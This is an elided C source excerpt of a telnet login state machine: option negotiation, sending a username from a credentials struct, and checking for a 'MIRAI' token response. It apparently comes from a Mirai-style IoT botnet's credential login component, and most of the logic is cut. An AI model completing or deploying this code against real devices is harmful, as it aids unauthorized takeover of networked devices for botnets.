    ...
    if (*ptr == TELNET_IAC) {
      ...
      if (ptr[1] == TELNET_DO) {
        ...
        if (ptr[2] == 31) {
          ...
          uint8_t sb_windowsize[9] = {TELNET_IAC, TELNET_SB, 31,
      ...
      if (ptr[1] == TELNET_WILL || ptr[1] == TELNET_WONT ||
          ptr[1] == TELNET_DONT) {
        if (!can_consume(conn, ptr, 2)) {
          break;
        }
 ...
 */
int telnet_consume_resp_prompt(telnet_conn_t *conn, const char *token,
                               size_t token_len, const char *incorrect_msg,
 ...
 */
int telnet_state_machine_process(telnet_conn_t *conn,
                                 const telnet_credentials_t *creds) {
  while (true) {
    int consumed = 0;
    ...
    case TELNET_STATE_WAITING_USERNAME:
      ...
      if (consumed > 0) {
        ...
        log_debug("Sent username: %.*s", (int)creds->username_len,
                  creds->username);
      }
      break;
    ...
    case TELNET_STATE_WAITING_TOKEN_RESP:
      consumed = telnet_consume_resp_prompt(conn, "MIRAI", 5, "incorrect", 9);
      if (consumed == -1) {
...
ssize_t telnet_receive_data(telnet_conn_t *conn) {
  ...
  ssize_t ret = recv_strip_null(conn->fd, conn->rdbuf + conn->rdbuf_pos,
                                RDBUF_SIZE - conn->rdbuf_pos, MSG_NOSIGNAL);
 ...
 */
void telnet_connection_init(telnet_conn_t *conn, int fd, uint32_t dst_addr,
                            uint16_t dst_port) {
